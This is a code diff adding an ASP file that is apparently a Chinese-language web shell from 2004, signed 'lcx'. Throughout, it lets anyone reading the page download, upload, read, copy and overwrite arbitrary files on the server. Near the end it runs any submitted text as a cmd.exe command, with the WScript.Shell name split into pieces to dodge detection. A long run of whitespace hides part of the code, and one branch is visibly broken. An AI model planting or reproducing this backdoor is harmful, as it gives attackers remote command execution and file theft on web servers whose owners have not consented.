@@ -1,0 +1,115 @@
+<%@codepage=936%>
+<%
+If Err.Number=-2147221005 Then 
+        Response.Write "<div align='center'>非常遗憾,您的主机不支持ADODB.Stream,不能使用本程序</div>"
+        Err.Clear
+        Response.End
+end if%>
+<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                %>
+<table border=0 width=100% align="left" cellspacing="0" cellpadding="0"> <%=FN%> 上传到: <%=session("lp")%>[<a href=# onclick=history.back()>继续上传</a>]<br></table></body>
+<%else
+on error resume next
+if session("lp")="" then
+session("lp")=server.mappath(".")
+else
+session("lp")=Request("h")
+end if%>
+<%'下载文件
+function dl(f,n)
+on error resume next
+Set S=CreateObject("Adodb.Stream") 
+S.Mode=3 
+S.Type=1 
+S.Open 
+S.LoadFromFile(f)
+if Err.Number>0 then 
+Response.Status="404"
+else
+Response.ContentType="application/octet-stream"
+Response.AddHeader "Content-Disposition:","attachment;filename=" & n
+Range=Mid(Request.ServerVariables("HTTP_RANGE"),7)
+if Range="" then
+Response.BinaryWrite(S.Read)
+else
+S.position=Clng(Split(Range,"-")(0))
+Response.BinaryWrite(S.Read)
+End if
+end if
+Response.End
+end function
+if request.form("down")="down" then 
+f=request.form("f")
+n=request.form("n")
+call dl(f,n)
+end if
+%>
+<form name=down method=post action="">
+<input name=f type=text value=源文件物理地址>
+<input name=n type=text value=保存的文件名>
+<input name=down value=down type=submit>
+</form>
+<script language="javascript">function check(){if(kk.file1.value==""){alert("请选择上传的文件！");return false;}}</script>
+<form name=kk enctype=multipart/form-data method=post action=?up=1 onsubmit="return check();">
+<table border=0 width=100% align=left valign=top cellpadding=0 cellspacing=0>
+<tr><td><br><input type=file name=file1> <input type=submit name=upload value=上传到:<%=session("lp")%>></form>
+<form method=POST>上传:<input type=text name=h value=<%=session("lp")%>><input type=submit value=更改></form>
+<%end if%>
+<%
+'读文件
+function readfile(URL,chartype)
+set srmObj = server.CreateObject("adodb.stream")
+url=request.form("name")
+srmObj.type=1
+srmObj.mode=3
+srmObj.open
+srmObj.Position=0
+srmObj.LoadFromFile URL
+srmObj.Position = 0
+srmObj.type=2
+srmObj.charset=chartype
+readfile=srmObj.readtext()
+end function
+if request.form("name")<>"" and request.form("name")<>"要读的文件物理地址" and request.form("ok")="read-copy-ren-write" then
+response.write "<hr><pre>" & Server.HTMLEncode(readfile(url,"gb2312"))&"<hr>"
+end if
+%>
+<%'复制并改名
+On Error Resume Next
+file1 = Request("file1")
+file2 = Request("file2")
+Set objStream = Server.CreateObject("ADODB.Stream")
+objStream.Type = 1 ' adTypeBinary
+objStream.Open
+objStream.LoadFromFile file1
+objStream.SaveToFile file2,2
+%>
+<% '写文件
+on error resume next 
+set lcx=server.CreateObject("Adodb.Stream") 
+lcx.Open 
+lcx.Type=2 
+lcx.CharSet="gb2312" 
+lcx.LoadFromFile request.form("save")
+lcx.Position=lcx.Size 
+lcx.writetext request.form("text")
+lcx.SaveToFile request.form("save"),2 
+lcx.Close 
+set lcx=nothing 
+%> 
+<form action="" method=post>
+<input type=text name=name value="当前文件地址：<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>">
+<input type=text name=file1 value="要copy的源文件物理地址"><input type=text name=file2 value="目地地址文件可以改名">
+<input type=text name=save value="写入的文件全名">
+<textarea name=text>文件内容</textarea>
+<input type=submit name=ok value="read-copy-ren-write">
+</form>
+<%'如服务器不支持wscript.shell组件，请将以下代码全部删去%>
+<form method="post">
+<input type=text name="cmd" size=60>
+<input type=submit value="cmd"></form>
+<textarea readonly cols=80 rows=20>
+<%response.write server.createobject("ws"+"cr"+"ipt.s"+"hell").exec("c"+"md.exe /c "&request.form("cmd")).stdout.readall%>
+</textarea>
+</td></tr></table>
+<br>
+<CENTER><font color=red>本版本除了cmd命令用到了wscript.shell外，其它全部用adodb.stream写成 by lcx 2004年10月13号</font><br></center>
